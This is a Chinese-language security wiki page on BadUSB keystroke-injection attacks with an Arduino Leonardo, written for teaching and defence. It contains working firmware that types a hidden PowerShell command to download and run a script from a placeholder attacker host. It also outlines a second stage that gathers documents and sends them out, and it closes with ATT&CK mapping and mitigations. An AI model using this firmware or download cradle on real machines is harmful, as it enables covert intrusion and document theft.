---
title: BadUSB HID 攻击实战：Arduino Leonardo 伪装键盘窃取文档
description: 详细记录利用 Arduino Leonardo 实现 BadUSB HID 攻击的原理、脚本编写、实战复现全过程，涵盖 HID 攻击向量、PowerShell
  命令执行、文档搜集与外发技术，并结合 0w1Club 硬件安全设备清单与培训体系提供防御视角。
category: program-analysis
tags:
- BadUSB
- HID Attack
- Arduino Leonardo
- Hardware Security
- Physical Access
- PowerShell
- Social Engineering
- 0w1Club
- Security Research
date: 2018-12-01
updated: '2026-11-14'
---

## 概述

本页面结构化记录 **BadUSB HID 攻击** 的核心原理与实战复现流程，重点聚焦于 **Arduino Leonardo** 作为低成本 BadUSB 设备的开发与利用。文章源自 0w1Club 微信公众号实战分享，展示了如何通过伪装成 HID 键盘设备，在物理接触目标电脑的极短时间窗口内（约 1 秒），注入预设按键序列调用 `Win+R` → `PowerShell` → 下载并执行远程脚本，实现文档搜集、打包、外发的完整攻击链。

> **⚠️ 法律与伦理声明**  
> 本页面仅供安全研究、红蓝对抗演练、硬件安全教学等合法授权场景参考。**严禁**将相关技术用于未经授权的渗透测试、数据窃取或任何违法活动。原文已明确标注「FBI WARNING：本文所涉及的剧情纯属虚构，请勿将这些手段用于安全研究之外的其他领域」。

---

## 攻击原理：HID 设备伪装与按键注入

### 核心机制

| 层面 | 说明 |
|------|------|
| **设备枚举** | Arduino Leonardo 基于 ATmega32U4，原生支持 USB HID 协议，插入电脑时被识别为标准键盘/鼠标，无需驱动，绕过设备白名单策略。 |
| **按键注入** | 通过 `Keyboard` 库发送 `press`/`release`/`print` 等 API，模拟真实用户键盘操作，OS 无法区分来源。 |
| **执行载体** | Windows 原生快捷键 `Win+R` 打开「运行」→ 输入 `powershell` → 执行单行命令下载二阶段脚本。 |
| **时间窗口** | 全链路约 **1 秒** 完成，利用「老师倒水/离座」等物理社工窗口，极难被察觉。 |

### 为何难以防御

1. **合法设备身份**：HID 设备属于人机交互必需品，EDR/杀毒软件默认放行。
2. **无代码落地**：一阶段仅发送按键，无二进制文件写入磁盘，静态查杀无效。
3. **利用可信进程**：PowerShell 为系统签名工具，命令执行极难被行为分析拦截（除非开启 **Constrained Language Mode** 或 **AMSI** 严格策略）。

---

## 实战复现：Arduino Leonardo 开发全流程

### 硬件准备

- **Arduino Leonardo**（或兼容 ATmega32U4 的 Pro Micro、Teensy 2.0 等）
- Micro USB 数据线
- 可选：3D 打印外壳伪装成普通 U 盘/充电器，增强隐蔽性

> 🔗 关联社团硬件资源：[[0w1club-hardware-atlas]] 中列出的 **Bad USB** 设备即为此类开发板，社团提供租借计划（2 积分/周），可用于线下实战演练。

### 固件编写（伪代码结构）

```cpp
#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(1000);                  // 等待枚举稳定
  Keyboard.press(KEY_LEFT_GUI); // Win 键
  Keyboard.press('r');          // R 键
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.tld/payload.ps1')\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {}  // 单次执行即可
```

**关键点解析**：

| 步骤 | 技术细节 |
|------|----------|
| `delay(1000)` | 留出设备枚举、驱动加载时间，避免按键丢失。 |
| `KEY_LEFT_GUI` | 对应 Windows 键，跨键盘布局通用。 |
| `-w hidden` | 隐藏 PowerShell 窗口，降低被发现概率。 |
| `IEX (New-Object Net.WebClient).DownloadString(...)` | 经典单行下载执行模式，兼容 Win7/8/10 默认 PowerShell 版本。 |

### 二阶段载荷设计（原文功能复现）

原文描述的下载脚本实现三大功能：

1. **遍历搜集**：递归扫描 `C:\Users\`、`D:\` 等路径，匹配 `*.docx`、`*.doc`、`*.pdf` 等文档后缀。
2. **打包压缩**：调用 `Compress-Archive` 或调用系统 `zip.exe` 打包为 `loot.zip`。
3. **隐蔽外发**：通过 SMTP（`Send-MailMessage`）或 HTTP POST 发送至攻击者邮箱/服务器，邮件主题留空、附件重命名迷惑审计。

> **防御视角**：此类脚本属于 **后利用框架**（如 PowerSploit、Nishang）标准模块，特征明显。开启 **PowerShell Script Block Logging**、**AMSI**、**Constrained Language Mode** 可有效阻断。

---

## 攻击链建模与 MITRE ATT&CK 映射

| 阶段 | Tactic (TA) | Technique (T) | 说明 |
|------|-------------|---------------|------|
| 物理接触 | **Initial Access** | **T1091 - Replication Through Removable Media** | 利用 HID 设备物理插入 |
| 按键注入 | **Execution** | **T1059.001 - PowerShell** | 通过 Run 对话框启动 PowerShell |
| 载荷下载 | **Command & Control** | **T1105 - Ingress Tool Transfer** | WebClient 下载二阶段脚本 |
| 文档搜集 | **Collection** | **T1005 - Data from Local System** | 遍历文档并打包 |
| 数据外发 | **Exfiltration** | **T1041 - Exfiltration Over Command and Control Channel** | 邮件/HTTP 回传 |

---

## 检测与缓解策略

### 主机侧加固

| 措施 | 效果 | 部署建议 |
|------|------|----------|
| **USB 设备白名单/组策略限制** | 仅允许已知 VID/PID 的 HID 设备枚举 | 通过 GPO `Computer Configuration → Administrative Templates → System → Device Installation → Device Installation Restrictions` 配置 |
| **PowerShell 受限语言模式** | 阻断 `IEX`、`New-Object Net.WebClient` 等高危调用 | 设置 `__PSLockdownPolicy` 环境变量或配置 AppLocker/WDAC 规则 |
| **AMSI + Script Block Logging** | 记录并拦截混淆/动态生成的恶意脚本 | 确保 `Turn on PowerShell Script Block Logging` 与 `Turn on PowerShell Transcription` 均已启用 |
| **攻击面减少规则 (ASR)** | 规则 `Block credential stealing from the Windows local security authority subsystem (lsass.exe)` 等间接阻断后利用 | Microsoft Defender for Endpoint / GPO `Attack Surface Reduction Rules` |

### 网络侧监控

- **DNS/HTTP 异常外联**：监控非业务域名的 `User-Agent: PowerShell`、`WebClient` 请求。
- **邮件网关 DLP**：拦截含大量文档附件、发件人异常的外发邮件。

### 物理安全与人员意识

- **无人值守锁屏**：强制 `Win+L` 或屏保密码策略，缩小物理攻击窗口。
- **USB 端口物理锁/胶水封堵**：针对高安全区域服务器/关键终端。
- **红蓝对抗演练**：定期开展 **BadUSB 实战演练**，验证检测规则与应急响应流程。

---

## 关联资源与延伸阅读

### 社团培训与硬件生态

- [[0w1club-hardware-atlas]] — 0w1Club 硬件图鉴租借计划，含 Bad USB、Proxmark3、Ubertooth One 等设备清单与租借规则。
- [[0w1club-week8-raspberry-pi-training]] — 社团第八期萌新培养「极客之旅——PI的有趣玩法」，含树莓派硬件租借入门。
- [[phishing-website-creation-tutorial]] — 同期第三周「五分钟制作钓鱼网站」培训，展示社会工程学与物理攻击的组合打法。
- [[crypto-basics-xor-stream-cipher-tutorial]] — 第四周密码学入门培训，体现社团「理论+实战」培养体系。

### 技术深度扩展

- **USB Rubber Ducky / Hak5 Ducky Script** — 商业化 BadUSB 平台，脚本语法与 Arduino `Keyboard` 库高度相似，可互译。
- **CactusWHID / WHID Injector** — 基于 ESP32 的无线 BadUSB，支持 Wi-Fi/蓝牙远程触发，进一步扩大攻击半径。
- **MITRE ATT&CK® T1091 / T1059.001** — 官方技术详情与缓解措施参考。

---

## 总结

BadUSB HID 攻击利用 **操作系统对 HID 设备的固有信任** 与 **PowerShell 强大的系统管理能力**，在物理接触的极短时间内完成从「按键注入」到「数据外发」的完整杀伤链。Arduino Leonardo 因其低成本、原生 USB HID、成熟开发生态，成为该攻击向量的入门首选。

**防御核心在于「纵深防御」**：
1. **物理层** 限制未授权 USB 设备枚举；
2. **主机层** 锁死 PowerShell 高危能力、开启全量日志审计；
3. **网络层** 监控异常外联与数据外发；
4. **人员层** 强化无人值守锁屏习惯与红蓝实战演练。

> 本页面旨在为蓝队构建检测规则、红队设计授权演练场景、高校社团开展硬件安全教学提供结构化知识基线。**请严守法律底线与职业道德，仅在授权范围内开展研究。**

## 来源

- [0w1网络安全俱乐部-201707-201903_42](../sources/0w1网络安全俱乐部-201707-201903_42.md)
